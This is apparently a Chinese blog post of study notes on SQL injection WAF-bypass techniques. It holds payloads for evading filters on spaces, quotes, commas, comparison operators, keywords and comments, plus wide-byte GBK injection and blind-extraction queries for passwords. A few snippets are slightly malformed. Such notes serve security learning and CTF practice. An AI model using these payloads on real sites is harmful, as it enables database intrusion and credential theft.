# SQL注入


# 文件上传漏洞

&gt; [参考博客](https://blog.csdn.net/qq_43390703/article/details/104858705)

# SQL注入

## 绕过空格

* 使用注释符`/*   */`

* 两个空格代替一个空格

* `%a0`

* 用Tab代替空格

* 括号绕过

  &gt; 前提时括号没被过滤

  **任何可以计算出结果的语句**，都可以用括号包围起来。而括号的两端，可以没有多余的空格。

  例：`select(user())fromdualwhere(1=1)and(2=2)`

## 引号绕过

* 使用十六进制

  例：

  ```
  ……where table_name=&#34;users&#34;		# 把users转为十六进制
  ……where table_name=0x7573657273
  ```

## 逗号绕过

&gt; 盲注的时候，substr()，mid()，limit()等方法需要逗号

* 对于`substr()`和`mid()`使用from to解决

  ```
  select substr(database(0 from 1 for 1);
  select mid(database(0 from 1 for 1);
  ```

* 对于`limit()`使用offset绕过

  ```
  select*from news limit0,1
  ===&gt; select*from news limit 1 offset 0
  ```

## 比较符号（&lt;&gt;）绕过

&gt; 盲注的时候，使用二分查找的时候需要使用到比较操作符来进行查找

* 使用greatest()绕过

```
select * from users where id=1 and ascii(substr(database(),0,1))&gt;64
===&gt; select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
```

* `or &#39;password&#39; &gt; &#39;pass&#39; or 1&lt;3`

## or and 绕过

* `and` =&gt; `&amp;&amp;`
* `or` =&gt; `||`

## 绕过注释符号（#，--）

```
id=1&#39; union select 1,2,3||&#39;1
id=1&#39;union select 1,2,&#39;3
```

同或(!=!)可以构造

```
username=tarnish&#39;!=!(1)!=!&#39;1	#(True !=! True !=! True) == True
username=tarnish&#39;!=!(0)!=!&#39;1	#(True !=! False !=! True) == False
```

原理：

```
同或 !=! 的逻辑：
1 !=! 1 == 1
1 !=! 0 == 0
0 !=! 1 == 0
0 !=! 0 == 1
```

## =绕过

* 用 like 
* `&gt;`
* `&lt;`

## 绕过union，select，where

### 使用注释符绕过

```
//
--
/**/
#
--&#43;
-- -
;
%00
--a
```

用法：`U/**/NION/**/SE/**/LECT/**/user，pwd from user`

### 大小写绕过

```
id=-1&#39;UnIoN/**/SeLeCT
```

### 内敛注释绕过

```
id=-1&#39;/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#
```

### 双写关键字绕过

```
id=-1&#39;UNIunionONSeLselectECT1,2,3–
```

### 通用绕过（编码）

* URLEncode

* ASCII

* HEX

* unicode

  一些unicode编码

  ```
  ```

  

```
or 1=1
%6f%72%20%31%3d%31
CHAR(101)&#43;CHAR(97)&#43;CHAR(115)&#43;CHAR(116)
```

### 等价函数绕过

```
hex()、bin()==&gt;ascii()

sleep()==&gt;benchmark()

concat_ws()==&gt;group_concat()

mid()、substr()==&gt;substring() @@user==&gt;user() @@datadir==&gt;datadir()
```

例如：`substring()`和`substr()`无法使用时

```
?id=1&#43;and&#43;ascii(lower(mid((select&#43;pwd&#43;from&#43;users&#43;limit&#43;1,1),1,1)))=74

substr((select&#39;password&#39;),1,1)=0x70strcmp(left(&#39;password&#39;,1),0x69)=1strcmp(left(&#39;password&#39;,1),0x70)=0strcmp(left(&#39;password&#39;,1),0x71)=-1
```

### 宽字节注入

&gt; 过滤单引号

过滤 `&#39;` 的时候往往利用的思路是将 &#39; 转换为 `\&#39;`

在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，所以会没有被反斜杠

* %df 吃掉 \ 具体的方法是 urlencode(&#39;\) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（&#39;）符号在外面

  ```
  id=-1%df%27union select 1,user(),3--&#43;
  ```

* 将 \&#39; 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉

* 一般产生宽字节注入的PHP函数

  * replace（）：过滤 &#39; \ ，将 &#39; 转化为 \&#39; ，将 \  转为 \\，将 &#34; 转为 \&#34; 。用方案1
  * addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：&#39; , &#34; , \ 。用方案1。（防御此漏洞，要将 mysql_query 设置为 binary 的方式）
  * mysql_real_escape_string()：转义下列字符：\x00  \n  \r  \&#39;&#34;  \x1a

## 截断绕过

* %00,%0A,?,/0,........,%80-%99
* 目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。
* ././././././././././././././././abc
* ..1/abc/../1/abc/../1/abc

## \N绕过

* \N其实相当于NULL字符

* ```
  select * from users where id=8E0 union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=8.0 union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=\Nunion select1,2,3,4,5,6,7,8,9,0
  ```


---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024web-sql%E6%B3%A8%E5%85%A5/  

